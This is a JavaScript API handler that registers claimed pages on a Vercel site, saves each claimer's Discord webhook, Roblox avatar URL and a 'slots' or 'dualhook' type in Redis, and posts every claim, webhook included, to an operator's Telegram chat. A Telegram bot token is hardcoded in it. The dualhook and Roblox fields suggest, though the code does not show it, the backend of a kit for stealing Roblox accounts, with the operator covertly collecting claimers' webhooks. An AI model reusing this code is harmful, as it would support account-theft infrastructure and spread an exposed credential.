// api/claim.js
// Claims a directory name and stores the config (webhook, type, etc.) in Redis.
// Also notifies your Telegram on every new claim.

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// ── Redis helpers ────────────────────────────────────────────────────────────

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  return json.result;
}

async function redisSet(key, value) {
  // value must be a string
  const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${REDIS_TOKEN}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ value: JSON.stringify(value) })
  });
  return res.ok;
}

// ── Telegram helper ──────────────────────────────────────────────────────────

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) { /* non-fatal */ }
}

// ── Handler ──────────────────────────────────────────────────────────────────

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const {
    name,          // directory slug  e.g. "opera"
    displayName,   // display name    e.g. "Opera Tools"
    webhook,       // main webhook (webhook1 for dualhook, only webhook for slots)
    inviteUrl,     // optional discord invite
    charUrl,       // optional roblox avatar url
    type           // "slots" | "dualhook"  (default "slots")
  } = body || {};

  // ── Validate ────────────────────────────────────────────────────────────────
  if (!name)    return res.status(400).json({ error: 'name is required' });
  if (!webhook) return res.status(400).json({ error: 'webhook is required' });

  const slug = name.trim().toLowerCase().replace(/\s+/g, '-');

  if (!/^[a-z0-9_-]+$/i.test(slug)) {
    return res.status(400).json({ error: 'Name can only contain letters, numbers, hyphens, underscores' });
  }

  // Reserved paths that must never be claimable
  const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
  if (RESERVED.includes(slug)) {
    return res.status(400).json({ error: 'That name is reserved' });
  }

  // ── Check availability ──────────────────────────────────────────────────────
  try {
    const existing = await redisGet(`slot:${slug}`);
    if (existing !== null) {
      return res.status(200).json({ taken: true });
    }

    // ── Store in Redis ──────────────────────────────────────────────────────
    const record = {
      slug,
      displayName: displayName || slug,
      webhook,                         // webhook1 (always present)
      inviteUrl:  inviteUrl  || '',
      charUrl:    charUrl    || '',
      type:       type === 'dualhook' ? 'dualhook' : 'slots',
      createdAt:  new Date().toISOString()
    };

    const ok = await redisSet(`slot:${slug}`, record);
    if (!ok) return res.status(500).json({ error: 'Failed to save — Redis write error' });

    const url = `https://spain-tools.vercel.app/${slug}`;

    // ── Telegram notification ───────────────────────────────────────────────
    const tgMsg = [
      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
      `📁 Slug: <code>${slug}</code>`,
      `🏷 Display: ${record.displayName}`,
      `🔗 URL: ${url}`,
      `📡 Webhook1: <code>${webhook}</code>`,
      inviteUrl ? `💬 Invite: ${inviteUrl}` : '',
      `🕐 ${record.createdAt}`
    ].filter(Boolean).join('\n');

    await tgSend(tgMsg);

    return res.status(200).json({ success: true, url, slug });

  } catch (err) {
    return res.status(500).json({ error: 'Server error', detail: err.message });
  }
}
